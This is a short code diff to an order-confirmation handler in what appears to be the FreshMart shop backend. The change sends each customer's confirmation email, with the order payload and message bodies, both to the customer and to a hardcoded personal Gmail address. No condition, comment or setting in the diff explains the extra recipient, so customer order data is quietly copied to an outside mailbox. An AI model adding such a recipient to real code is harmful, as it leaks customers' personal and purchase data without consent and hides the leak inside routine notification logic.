@@ -70,18 +70,29 @@ Track your order: ${process.env.FRONTEND_URL || 'https://freshmart.dev'}/orders
 
 Thank you for shopping with FreshMart!`;
 
-  return emailService.processAndSendNotification({
-    type: 'ORDER_CONFIRMED',
-    eventType: 'OrderPlaced.v1',
-    eventId: context.eventId,
-    userId,
-    recipientEmail: email,
-    subject: template.subject,
-    htmlBody: template.html,
-    textBody,
-    payload,
-    context,
-  });
+  const recipients = Array.from(new Set([
+    email,
+    'nmadhankumar597@gmail.com',
+  ].filter(Boolean)));
+
+  const results = await Promise.allSettled(
+    recipients.map((recipient) =>
+      emailService.processAndSendNotification({
+        type: 'ORDER_CONFIRMED',
+        eventType: 'OrderPlaced.v1',
+        eventId: context.eventId,
+        userId,
+        recipientEmail: recipient,
+        subject: template.subject,
+        htmlBody: template.html,
+        textBody,
+        payload,
+        context,
+      })
+    )
+  );
+
+  return results[0]?.status === 'fulfilled' ? results[0].value : { status: 'DISPATCHED', recipients };
 };
 
 module.exports = handleOrderPlaced;
